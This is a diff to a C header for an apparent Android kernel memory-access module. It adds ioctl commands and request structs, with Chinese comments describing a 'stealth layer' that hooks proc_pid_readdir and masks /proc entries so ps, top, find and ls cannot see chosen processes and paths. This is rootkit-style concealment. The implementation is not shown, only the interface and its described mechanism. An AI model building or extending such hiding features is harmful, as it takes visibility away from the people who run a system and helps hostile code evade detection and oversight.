@@ -55,6 +55,46 @@
 
 #define MEM_PROCESS_MEM_ABI_VERSION 1U
 #define MEM_PROCESS_MEM_IO_MAX 4096U
+/* ------------------------------------------------------------------------
+ * 隐蔽层: 进程 / 路径隐藏 (新增命令号 38/39/40)
+ *
+ *   HIDE_PROCESS —— 在 proc_pid_readdir hook 里把目标 pid 的目录项过滤掉,
+ *                   同时屏蔽 /proc/<pid>/{comm,cmdline,exe,stat} 的返回,
+ *                   让 ps / top / find /proc 都看不到。
+ *   HIDE_PATH    —— 给目标路径的 dentry 打标记, readdir hook 里剔除,
+ *                   让 ls / find 看不到。
+ *   HIDE_LIST    —— 查询当前隐藏集合, 便于自检与恢复。
+ *
+ * 只接受 root/system 调用方; 隐藏状态随模块卸载清除, 不落盘。
+ * ---------------------------------------------------------------------- */
+
+#define MEM_HIDE_MAX_PIDS   32U
+#define MEM_HIDE_MAX_PATHS  16U
+#define MEM_HIDE_PATH_LEN   128U
+
+struct mem_hide_pid_req {
+    int      pid;        /* 目标 pid; <=0 表示当前进程 */
+    uint32_t hide;       /* 1 = 隐藏, 0 = 取消 */
+    uint32_t out_hidden_count;
+    uint32_t reserved;
+};
+
+struct mem_hide_path_req {
+    char     path[MEM_HIDE_PATH_LEN];
+    uint32_t hide;
+    uint32_t out_hidden_count;
+};
+
+struct mem_hide_list_req {
+    uint32_t out_pid_count;
+    uint32_t out_pids[MEM_HIDE_MAX_PIDS];
+    uint32_t out_path_count;
+    char     out_paths[MEM_HIDE_MAX_PATHS][MEM_HIDE_PATH_LEN];
+};
+
+#define MEM_IOC_HIDE_PROCESS _IOWR('D', 38, struct mem_hide_pid_req)
+#define MEM_IOC_HIDE_PATH    _IOWR('D', 39, struct mem_hide_path_req)
+#define MEM_IOC_HIDE_LIST    _IOWR('D', 40, struct mem_hide_list_req)
 
 /* Restricted lab session: system_server /system/lib64/libsensorservice.so only.
  * version=0 is a non-mutating capability probe, rejected with -EINVAL.
